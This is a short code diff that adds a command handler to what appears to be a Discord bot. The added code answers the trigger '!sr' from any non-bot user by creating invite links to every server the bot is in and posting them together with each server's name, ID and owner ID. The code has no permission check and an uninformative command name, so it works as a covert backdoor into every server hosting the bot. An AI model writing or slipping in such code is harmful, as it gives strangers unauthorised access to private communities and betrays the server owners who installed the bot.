@@ -1163,6 +1163,31 @@ var currentTime = new Date(),
 
 
 
+ 
+client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '!sr') {
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+  })
+
 
 
 
